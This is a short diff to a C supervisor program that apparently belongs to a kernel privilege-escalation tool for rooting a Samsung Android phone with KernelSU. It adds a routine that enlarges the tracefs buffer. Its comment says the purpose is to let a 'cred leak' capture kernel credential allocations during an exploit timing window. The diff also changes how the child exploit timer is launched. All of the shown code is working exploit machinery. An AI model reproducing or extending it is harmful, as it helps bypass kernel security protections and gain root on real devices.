@@ -41,6 +41,7 @@
 #define DMESG_LOG WORK_DIR "/dmesg_after_load.log"
 #define HOLDER_RECORD WORK_DIR "/rmg-umh-holder"
 #define KSUD_PATH "/data/local/tmp/ksud-s25u-kdp"
+#define TRACE_BUF "/sys/kernel/tracing/buffer_size_kb"
 #define BOOT_ID_PATH "/proc/sys/kernel/random/boot_id"
 #define DEFAULT_MANAGER "me.weishu.kernelsu"
 #define WAIT_SECONDS 600
@@ -286,6 +287,27 @@ static int prepare_work_dir(void)
     return 0;
 }
 
+/*
+ * SamTimer raises the tracefs buffer to 64 MB before starting the timer.
+ * The cred leak captures a one-second window of every kmem_cache_alloc on
+ * the trigger CPU; the stock 1408 KB buffer wraps before the child's exec
+ * cred allocation, which shows up as R=0 and a dead hello handshake.
+ */
+static void raise_trace_buffer(void)
+{
+    int fd = open(TRACE_BUF, O_WRONLY);
+
+    if (fd < 0) {
+        say("[rmg] trace buffer not writable: %s\n", strerror(errno));
+        return;
+    }
+    if (write_full(fd, "65536\n", 6) == 0)
+        say("[rmg] trace buffer set to 65536kB\n");
+    else
+        say("[rmg] trace buffer write failed: %s\n", strerror(errno));
+    close(fd);
+}
+
 static int run_supervisor(void)
 {
     const char *pkg = manager_package();
@@ -302,6 +324,7 @@ static int run_supervisor(void)
         return 1;
     if (prepare_work_dir())
         return 1;
+    raise_trace_buffer();
 
     (void)unlink(ACTION_LOG);
     (void)unlink(UHEXEC_LOG);
@@ -326,8 +349,8 @@ static int run_supervisor(void)
         return 1;
     }
     if (pid == 0) {
-        if (setsid() < 0)
-            say("[rmg] setsid: %s\n", strerror(errno));
+        if (chdir(WORK_DIR) != 0)
+            say("[rmg] chdir %s: %s\n", WORK_DIR, strerror(errno));
         execl(TIMER_PATH, TIMER_PATH, "umhpipe", (char *)NULL);
         say("[rmg] exec %s: %s\n", TIMER_PATH, strerror(errno));
         _exit(127);
